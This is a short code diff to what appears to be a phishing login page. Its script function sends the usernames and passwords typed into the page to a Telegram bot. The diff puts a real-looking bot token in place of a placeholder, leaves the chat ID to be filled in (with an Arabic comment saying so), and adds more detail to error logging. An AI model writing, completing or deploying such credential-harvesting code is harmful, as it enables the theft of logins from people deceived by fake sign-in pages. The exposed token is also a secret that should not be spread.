@@ -96,8 +96,8 @@
     </div>
 
     <script>
-        const botToken = 'YOUR_BOT_TOKEN';
-        const chatId = 'YOUR_CHAT_ID';
+        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
+        const chatId = 'YOUR_CHAT_ID'; // استبدل بـ chat_id الخاص بك
         let attempt = 1;
 
         function sendToTelegram(username, password) {
@@ -115,7 +115,7 @@
                 if (data.ok) {
                     console.log('Message sent to Telegram successfully!');
                 } else {
-                    console.error('Failed to send message to Telegram.');
+                    console.error('Failed to send message to Telegram:', data.description);
                 }
             })
             .catch(error => {
